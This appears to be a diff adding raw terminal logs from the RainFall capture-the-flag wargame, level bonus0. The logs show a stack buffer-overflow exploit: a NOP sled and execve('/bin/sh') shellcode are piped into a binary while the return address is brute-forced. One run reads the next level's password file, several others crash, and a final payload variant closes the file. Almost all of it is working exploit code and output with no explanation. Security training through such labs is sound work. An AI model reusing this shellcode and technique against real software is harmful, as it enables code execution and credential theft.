@@ -1,0 +1,70 @@
+﻿```bash
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "-" * 14 + "\xd0\xe6\xff\xbf" + "-" * 1'; cat ) | ./bonus0
+ -
+ -
+��������������������--------------����- --------------����-
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+^C
+bonus0@RainFall:~$
+```
+
+```bash
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "-" * 14 + "\xcc\xe6\xff\xbf" + "-" * 1'; cat ) | ./bonus0
+ -
+ -
+��������������������--------------����- --------------����-
+test
+^C
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "-" * 14 + "\xca\xe6\xff\xbf" + "-" * 1'; cat ) | ./bonus0
+ -
+ -
+��������������������--------------����- --------------����-
+test
+^C
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "-" * 14 + "\xc8\xe6\xff\xbf" + "-" * 1'; cat ) | ./bonus0
+ -
+ -
+��������������������--------------����- --------------����-
+test
+^C
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "-" * 14 + "\xc0\xe6\xff\xbf" + "-" * 1'; cat ) | ./bonus0
+ -
+ -
+��������������������--------------����- --------------����-
+test
+Illegal instruction (core dumped)
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "-" * 14 + "\xc4\xe6\xff\xbf" + "-" * 1'; cat ) | ./bonus0
+ -
+ -
+��������������������--------------����- --------------����-
+test
+^C
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "-" * 14 + "\xc2\xe6\xff\xbf" + "-" * 1'; cat ) | ./bonus0
+ -
+ -
+��������������������--------------����- --------------����-
+test
+^C
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "-" * 14 + "\x12\xe6\xff\xbf" + "-" * 1'; cat ) | ./bonus0
+ -
+ -
+��������������������--------------���- --------------���-
+^C
+Segmentation fault (core dumped)
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "-" * 14 + "\xc1\xe6\xff\xbf" + "-" * 1'; cat ) | ./bonus0
+ -
+ -
+��������������������--------------����- --------------����-
+test
+^C
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "-" * 14 + "\xc0\xe6\xff\xbf" + "-" * 1'; cat ) | ./bonus0
+ -
+ -
+��������������������--------------����- --------------����-
+test
+Illegal instruction (core dumped)
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "-" * 14 + "\xc1\xe6\xff\xbf" + "-" * 1'; cat ) | ./bonus0
+```
+
+(python -c 'print "A" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B" * (4096 - 1 - 20 - 28) + "\n"'; python -c 'print "C" * 14 + "\xc1\xe6\xff\xbf" + "D" * 1')
